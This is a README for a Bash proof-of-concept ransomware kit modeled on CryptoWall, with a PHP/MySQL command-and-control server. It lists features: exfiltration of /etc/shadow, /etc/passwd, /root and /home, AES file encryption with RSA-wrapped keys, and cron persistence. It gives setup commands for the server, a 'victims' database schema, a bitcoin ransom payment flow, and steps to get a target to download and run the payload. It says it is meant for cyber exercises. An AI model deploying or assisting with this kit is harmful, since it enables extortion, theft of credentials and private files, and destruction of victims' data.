# Bash Ransomware

## Synopsis
 Simple Bash POC cryptoware that is modeled after CryptoWall 3.0/4.0

## Requirements
 - openssl
 - jquery
 - mysql
 - php 5 (php5-mysql)
 - apache2 

## Features
 - Secure Comunications over HTTPS to the C2 
 - Data Exfil from the target (key.bin, /home/, /root, /etc/passwd, and /etc/shadow) - Based on Chimera Ransomware that threatens to release private documents if ransom is not paid
 - Filename and File extension encryption has been added (Reference: Talos CW 4.0 Report), keeps a mapping in /root/..file_mapping.db with file permissions
 - File Encryption based on a set of defined file extensions, should encrypt files in '/' and encrypt mount points (USB, NFS, etc.)
 - Screenshot functionality (Still in development for wider OS support + Support for terminal only systems)
 - Unique Private/Public Key Pair per victim

## Feature Requests
 - Move DB settings into a common.php file and refer to that file in each of the scripts (One place to edit instead of numerous places)

## Bugs
 - After payment has been submitted, the page will count down past 00:00:00 into negative time (-00:00:34) - The user has to manually refresh the page in order to gain access to the download links
 - Since the program encrypts critical files, some files may not be properly restored which partially breaks the host (Working on better restoration processes)

## Notes
 - Added Encryption and Decryption Run Times (Run times were calculated with the new filename encryption - run times are obviously longer than without)
 - sample_files directory contains the HTTP C2 communications, a sample key.bin file, and file_mapping.db file
 - Python and C versions of the BashCrypt are currently in development and should be released in the near future
 - Windows executable and powershell versions are also in development
 - You may notice that the configuration is insecure (e.g. - no db password, processes running as root, etc.). This is just for testing purposes in my dev environment. If you use this in an exercise, you will want to follow best practices to secure the C2 server
 - The codebase uses newer versions of software, like PHP. You may run into environments with older versions of PHP that do not support some of the built-in PHP functions. In this case, you will have to modify the code. Specifically, I ran into a PHP version that was < 5.2 and the DateTime function is not in that release.
 - To solve this, repleace the occurences of DateTime to the following:
 - # target.php
   - `$expTime = time() + (2 * 24 * 60 * 60);`
   - `$dateExpTime = strtotime($expTime);`
   - `$expTime = date('Y-m-d H:i:s', $dateExpTime);`
 - # Or in one line:
   - `$expTime = date('Y-m-d H:i:s', strtotime(time() + (2 * 24 * 60 * 60)));`

## What to do on the server-side
 - > Configure your comms over HTTPS
 - > Sample certs are in the sample_apache_conf directory
 - $ `openssl genrsa -des3 -passout pass:neveruseinsecurepasswords -out server.pass.key 4096`
 - $ `openssl rsa -passin pass:neveruseinsecurepasswords -in server.pass.key -out server.key`
 - $ `openssl req -new -key server.key -out server.csr`
 - $ `openssl x509 -req -days 4096 -in server.csr  -signkey server.key -out server.crt`
 - $ `chmod 600 server.*`
 - $ `mkdir -p /etc/ssl/certs/`
 - $ `mv server.key /etc/ssl/certs/`
 - $ `mv server.crt /etc/ssl/certs/`
 - > Use the sample apache SSL and Default configurations in sample_apache_conf as a guide
 - > Then configure your apache to redirect HTTP traffic to HTTPS
 - > Enable SSL
 - $ `a2enmod ssl`
 - $ `servive apache2 restart`

 - > Modify crypto.sh and replace the IP with your web server's IP/URL
   - $ `sed -i 's/192\.168\.1\.132/YYY\.YYY\.YYY\.YYY/g' crypto.sh` # Where YYY.YYY.YYY.YYY is your IP
 - > OR
   - $ `sed -i 's/192\.168\.1\.132/www\.yourdomain\.com/g' crypto.sh`
   - $ `cp crypto.sh /var/www/html/downloads/`
 - > Copy all of the ransomware files to /var/www/html
 - > You should have all of the php files in the root of your web dir (/var/www/html/)
 - > You should also have /var/www/html/images/ and /var/www/html/scripts/
   - $ `cd /var/www/html/`
 - > Modify admin.php, admin_query.php, decrypt.php, query.php, count.php, and target.php with your database information
   - $ `chown -R www-data:root /var/www/html/`
 - > Next, create the database for storing the data
   - $ `mysql -u [user] -p`
   - $ `create database victims;`
   - $ `use victims;`
   - $ `create table target_list (id int(6) unsigned auto_increment primary key, unique_id varchar(16) not null, target_ip varchar(30), file_count int not null, curr_time timestamp not null, exp_time timestamp not null, time_expired bool not null, paid bool not null, paid_count timestamp not null);`
   - $ `exit`

## Bitcoin Exchange
 - This feature was added to add a dimension of realism to this project. This feature allows the user to visit our exchange in order to obtain a working bitcoin transaction id that will be accepted by the payment page
 - Previously, the payment page accepted any 64 character string (length of a Bitcoin transaction id)
 - Users have to find a way to obtain the required amount of bitcoin for their payment (either 2 or 5 BTC)
 - These files can either be added to the same host or to another host
 - Directions:
   - Mysql:
   - `mysql -u [user] -p`
   - `create database exchange`
   - `create table users (id int(6) unsigned auto_increment primary key, username varchar(16) not null, password varchar(32) not null);`
   - `exit`
   - Web pages:
     - `cp -R exchange/ /var/www/html`
 - Note: You must use this in order to get a transaction id that will be accepted by the payment page

## What to do on the client-side
 - Get target to download the file and execute or if you have have access to the system, download it directly
 - $ `chmod 755 crypto.sh`
 - $ `./crypto.sh &`

## What it does
 - Downloads the public key from our server 
 - Generates a key file on the target
 - Loops through the system for files with the defined extensions and Uses AES-256 to encrypt the files on the system using the generated key
 - Deletes the original file, leaving only the encrypted file
 - The key file is then encrypted using the public key (RSA-4096)
 - Prints a ransom message and then persists that message through cron
 - In each dir, an INSTRUCTIONS.txt file is created and contains the ransome message
 - Links to a web page where the user can see an active countdown of the time that is left before key deletion

## Acknowledgements/Contributors
  - Special thanks to zmallen and his lollocker (https://github.com/zmallen/lollocker) => lollocker served as the inspiration for this project

## Sources
  - Excellent CryptoWall 3.0 Writeup: http://blog.brillantit.com/?p=15
  - CryptoWall 3.0 Writeup: http://www.sentinelone.com/blog/anatomy-of-cryptowall-3-0-a-look-inside-ransomwares-tactics/
  - Chimera Ransomware: https://threatpost.com/chimera-ransomware-promises-to-publish-encrypted-data-online/115293/
  - CryptoWall message text used came from https://www.pcrisk.com/removal-guides/7844-cryptowall-virus
  - CryptoWall 4.0: http://securityaffairs.co/wordpress/41718/cyber-crime/cryptowall-4-0-released.html
  - CryptoWall 4.0 DECRYPT.html: http://www.bleepstatic.com/images/news/ransomware/cryptowall/v4/note-part-1.jpg
  - Talos CryptoWall 4.0 Report: http://blog.talosintel.com/2015/12/cryptowall-4.html

## WARNING 
  - Use this tool at your own risk. Author is not responsible or liable if you damage your own system or others. Follow all local, state, federal, and international laws as it pertains to your geographic location. Do NOT use this tool maliciously as it is being released for educational purposes. This tools intended use is in cyber exercises or demonstrations of adversarial tools.

## Screenshots

   - Infected: <br />
   ![Infected](/screenshots/infected.jpg?raw=true "Infected") <br />
   - Encrypted Filenames: <br />
   ![Filenames1](/screenshots/filename_encrypt.jpg?raw=true "Filenames1") <br />
   - Decrypted Filenames: <br />
   ![Filenames2](/screenshots/filename_decrypt.jpg?raw=true "Filenames2") <br />
   - Encryption Run Time: <br />
   ![Erun](/screenshots/EncryptTime.jpg?raw=true "Erun") <br />
   - Decryption Run Time: <br />
   ![Drun](/screenshots/DecryptTime.jpg?raw=true "Drun") <br />
   - Instructions: <br />
   ![Instructions 1](/screenshots/INSTRUCTIONS_1.jpg?raw=true "Instructions 1") <br />
   ![Instructions 2](/screenshots/INSTRUCTIONS_2.jpg?raw=true "Instructions 2") <br />
   - Decryption Page: <br />
   ![Decrypt](/screenshots/decrypt_page.jpg?raw=true "Decrypt") <br />
   - Countdown: <br />
   ![Countdown](/screenshots/time_countdown.jpg?raw=true "Countdown") <br />
   - Admin: <br />
   ![Admin](/screenshots/admin_portal.jpg?raw=true "Admin") <br />
   - Payment (Time Remaining): <br />
   ![Payment1](/screenshots/payment1.jpg?raw=true "Payment1") <br />
   - Payment (Time Expired): <br />
   ![Payment2](/screenshots/payment2.jpg?raw=true "Payment2") <br />
   - After Payment (2 Hour Wait): <br />
   ![AfterPayment1](/screenshots/Decryption_After_Payment_1.jpg?raw=true "AfterPayment1") <br />
   - After Payment (Downloads Available): <br />
   ![AfterPayment2](/screenshots/Decryption_After_Payment_2.jpg?raw=true "AfterPayment2") <br />

   - Exchange List: <br />
   ![ExchangeList](/screenshots/Exchanges.jpg?raw=true "ExchangeList") <br />
   - Exchange Login: <br />
   ![ExchangeLogin](/screenshots/ExchangeLogin.jpg?raw=true "ExchangeLogin") <br />
   - Exchange Logged In: <br />
   ![ExchangeLoggedIn](/screenshots/LoggedIn.jpg?raw=true "ExchangeLoggedIn") <br />
   - Exchange Transaction ID: <br />
   ![TransactionID](/screenshots/TransID.jpg?raw=true "TransactionID") <br />
